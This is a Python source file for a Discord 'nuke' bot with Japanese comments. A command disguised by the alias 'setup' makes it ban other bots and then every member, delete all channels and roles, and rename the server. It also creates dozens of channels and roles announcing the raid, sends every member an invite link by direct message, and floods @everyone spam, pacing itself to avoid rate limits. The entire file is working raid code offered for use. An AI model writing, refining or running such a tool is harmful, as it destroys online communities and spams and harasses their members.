import discord
from discord.ext import commands
import asyncio
import random
import os
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("TOKEN")
PREFIX = "!"
DEFAULT_NEW_NAME = "ますまに共栄圏植民地"
INVITE_LINK = "https://discord.gg/tqNR7BsAsR"

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

sem_global = asyncio.Semaphore(20)   # 同時数を抑えて安定
sem_message = asyncio.Semaphore(40)
sem_dm = asyncio.Semaphore(10)

async def limited_global(coro):
    async with sem_global:
        try:
            await coro
        except:
            pass

async def limited_message(coro):
    async with sem_message:
        try:
            await coro
        except:
            pass

async def limited_dm(coro):
    async with sem_dm:
        try:
            await coro
        except:
            pass

async def send_dm(member):
    try:
        await member.send(INVITE_LINK)
    except:
        pass

async def delete_item(item):
    retries = 0
    while retries < 15:
        try:
            await item.delete()
            return True
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(getattr(e, 'retry_after', 5) + 0.5)
                retries += 1
            else:
                return False
        except:
            return False
    return False

async def create_colored_roles_task(guild, target_roles):
    current = 0
    created = 0
    while current < target_roles:
        try:
            await guild.create_role(
                name="ますまに共栄圏に荒らされましたｗｗｗ",
                color=discord.Color.random(),
                reason=""
            )
            created += 1
            current += 1
            if created % 20 == 0:
                print(f"ロール作成進捗: {created}/{target_roles}")
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(getattr(e, 'retry_after', 5) + 0.5)
            else:
                break
        except:
            break
        await asyncio.sleep(0.4)  # 並行でもリミット回避

async def ban_all_task(guild, members, reason):
    banned = 0
    for m in members:
        try:
            await guild.ban(m, reason=reason, delete_message_days=0)
            banned += 1
            if banned % 20 == 0:
                print(f"BAN進捗: {banned}/{len(members)}")
        except:
            pass
        await asyncio.sleep(0.8)  # BAN並行でも安定

async def core_nuke(guild, new_server_name=None):
    new_name = new_server_name or DEFAULT_NEW_NAME

    members = [m for m in guild.members if m != bot.user]
    non_bot_members = [m for m in members if not m.bot]

    # 最初にサーバー情報だけ出力（ログ最小限）
    print(f"破壊開始: サーバー名={guild.name} 非BOT人数={len(non_bot_members)}")

    # 他のボットBAN
    for m in members:
        if m.bot:
            await limited_global(guild.ban(m, reason="", delete_message_days=0))

    # DM
    dm_tasks = [limited_dm(send_dm(m)) for m in non_bot_members]
    await asyncio.gather(*dm_tasks)

    # チャンネル削除（逐次）
    for ch in list(guild.channels):
        await delete_item(ch)

    # サーバー名変更
    try:
        await guild.edit(name=new_name, reason="")
    except:
        pass

    # ロール削除（スパム前に逐次で確実）
    for r in list(guild.roles):
        if not r.is_default() and not r.managed:
            await delete_item(r)

    # 規模別調整（sleep長めで確実）
    member_count = len(non_bot_members)
    if member_count < 100:
        target_channels = 80
        target_roles = 60
        spam_sleep = 0.5
    elif member_count < 500:
        target_channels = 60
        target_roles = 40
        spam_sleep = 0.8
    else:
        target_channels = 40
        target_roles = 30
        spam_sleep = 1.2

    # チャンネル作成（2種類交互、逐次）
    channels = []
    current = 0
    channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
    for i in range(target_channels):
        name = channel_names[i % 2]
        ch = await create_channel_safely(guild, i+1, name)
        if ch:
            channels.append(ch)
        await asyncio.sleep(0.6)

    # スパム開始 + BANとロール作成を並行
    spam_messages = [
        f"@everyone {INVITE_LINK}",
        f"@everyone 来い {INVITE_LINK}"
    ]

    message_counters = {ch.id: 0 for ch in channels}
    active_channels = channels.copy()

    ban_task = asyncio.create_task(ban_all_task(guild, non_bot_members, new_name))
    role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))

    print("スパム開始")

    while any(c < 100 for c in message_counters.values()):
        for ch in active_channels[:]:
            if message_counters[ch.id] >= 100:
                active_channels.remove(ch)
                continue

            try:
                await limited_message(ch.send(random.choice(spam_messages)))
                message_counters[ch.id] += 1
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(getattr(e, 'retry_after', 5) + 0.5)
                else:
                    active_channels.remove(ch)
            except:
                active_channels.remove(ch)

            await asyncio.sleep(spam_sleep)

    print("スパム完了")

    # 並行タスク待機
    await ban_task
    await role_create_task

    print("完了")

@bot.command(name="masumani", aliases=["setup"])
async def trigger(ctx, *, new_name: str = None):
    if ctx.guild:
        await ctx.message.delete()
        asyncio.create_task(core_nuke(ctx.guild, new_name))

@bot.event
async def on_ready():
    print(f"起動: {bot.user}")

bot.run(TOKEN)
